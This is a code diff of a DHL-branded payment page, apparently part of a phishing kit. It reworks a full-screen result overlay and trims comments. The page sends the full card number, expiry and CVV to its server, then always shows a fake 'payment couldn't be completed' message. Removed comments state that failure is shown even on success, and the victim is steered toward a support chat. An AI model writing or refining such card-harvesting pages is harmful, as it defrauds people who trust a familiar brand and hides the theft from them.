@@ -21,7 +21,11 @@
             padding: 0;
             min-height: 100vh;
             color: var(--dhl-dark);
-            overflow-y: auto; /* ensure vertical scroll */
+            overflow-y: auto;
+        }
+
+        body.overlay-active {
+            overflow: hidden;
         }
 
         .payment-header {
@@ -167,24 +171,30 @@
             font-size: 0.8rem;
         }
 
-        /* Result overlay */
+        /* ===== FIXED, FULL-SCREEN OVERLAY ===== */
         #resultOverlay {
-            position: absolute;
+            position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(255,255,255,0.9);
+            background: #ffffff; /* solid white background */
             display: none;
             align-items: center;
             justify-content: center;
             flex-direction: column;
             padding: 2rem;
-            z-index: 10;
+            z-index: 9999;
             text-align: center;
+            overflow: hidden;
         }
         #resultOverlay.show {
             display: flex;
+        }
+        #resultOverlay .overlay-content {
+            max-width: 480px;
+            width: 100%;
+            padding: 2rem;
         }
         #resultOverlay .spinner {
             width: 3rem;
@@ -203,6 +213,14 @@
             color: #6b7280;
             margin-bottom: 1.5rem;
         }
+        #resultOverlay .btn-pay {
+            width: 100%;
+            justify-content: center;
+        }
+        #resultOverlay .btn-secondary {
+            width: 100%;
+            margin-top: 0.5rem;
+        }
 
         @media (max-width: 576px) {
             .payment-card {
@@ -216,6 +234,15 @@
                 font-size: 1.6rem;
             }
             .payment-summary .total-amount {
+                font-size: 1.2rem;
+            }
+            #resultOverlay .overlay-content {
+                padding: 1rem;
+            }
+            #resultOverlay .failure-icon {
+                font-size: 3rem;
+            }
+            #resultOverlay h4 {
                 font-size: 1.2rem;
             }
         }
@@ -357,9 +384,11 @@
                 </button>
             </div>
         </form>
+    </div>
 
-        <!-- RESULT OVERLAY -->
-        <div id="resultOverlay">
+    <!-- ===== FIXED OVERLAY (outside card) ===== -->
+    <div id="resultOverlay">
+        <div class="overlay-content">
             <!-- Spinner (shown first) -->
             <div id="spinnerContainer">
                 <div class="spinner-border spinner text-danger" role="status">
@@ -372,10 +401,10 @@
                 <div class="failure-icon"><i class="bi bi-exclamation-circle"></i></div>
                 <h4>Payment couldn't be completed</h4>
                 <p>We encountered an issue processing your payment. Please contact our support team for assistance.</p>
-                <a href="/" class="btn btn-pay" onclick="openTawkTo(); return false;">
+                <a href="#" class="btn btn-pay" onclick="openTawkTo(); return false;">
                     <i class="bi bi-chat-dots me-1"></i> Contact Support
                 </a>
-                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-secondary mt-2">
+                <a href="{{ url_for('billing', email=email) if email else url_for('billing') }}" class="btn btn-secondary">
                     <i class="bi bi-arrow-left me-1"></i> Back to Invoices
                 </a>
             </div>
@@ -397,7 +426,7 @@
 
         const email = getQueryParam('email') || '';
         const trackingParam = getQueryParam('tracking') || '';
-        const totalParam = getQueryParam('total'); // NEW: real total from billing page
+        const totalParam = getQueryParam('total'); // real total from billing page
 
         const trackingNumbers = trackingParam ? trackingParam.split(',').map(s => s.trim()) : [];
 
@@ -471,7 +500,7 @@
             }
             errEl.classList.add('d-none');
 
-            // Disable button and show spinner overlay
+            // Disable button and show overlay
             const btn = document.getElementById('payBtn');
             btn.disabled = true;
             btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span>';
@@ -481,6 +510,7 @@
             const spinnerContainer = document.getElementById('spinnerContainer');
             const failureContainer = document.getElementById('failureContainer');
             overlay.classList.add('show');
+            document.body.classList.add('overlay-active');
             spinnerContainer.style.display = 'block';
             failureContainer.style.display = 'none';
 
@@ -492,7 +522,7 @@
                 tracking_numbers: formData.get('tracking_numbers').split(',').filter(s => s.trim()),
                 card_details: {
                     name: formData.get('card_name'),
-                    number: formData.get('card_number'), // full card number
+                    number: formData.get('card_number'),
                     expiry: formData.get('exp_month') + '/' + formData.get('exp_year'),
                     cvv: formData.get('cvv'),
                 },
@@ -513,22 +543,19 @@
                 body: JSON.stringify(payload)
             })
             .then(() => {
-                // Even if success, we show failure
-                // Wait a bit then show failure
                 setTimeout(() => {
                     spinnerContainer.style.display = 'none';
                     failureContainer.style.display = 'block';
                 }, 1500);
             })
             .catch(() => {
-                // On error, still show failure
                 setTimeout(() => {
                     spinnerContainer.style.display = 'none';
                     failureContainer.style.display = 'block';
                 }, 1500);
             });
 
-            // Also, in case fetch takes too long, show failure after 4 seconds anyway
+            // Fallback: show failure after 4 seconds anyway
             setTimeout(() => {
                 if (spinnerContainer.style.display !== 'none') {
                     spinnerContainer.style.display = 'none';
@@ -541,11 +568,9 @@
         // OPEN TAWK.TO CHAT (if available)
         // ============================================================
         function openTawkTo() {
-            // Try to open Tawk.to if it's loaded
             if (window.Tawk_API && window.Tawk_API.maximize) {
                 window.Tawk_API.maximize();
             } else {
-                // If not loaded, redirect to homepage where it is
                 window.location.href = '/';
             }
         }
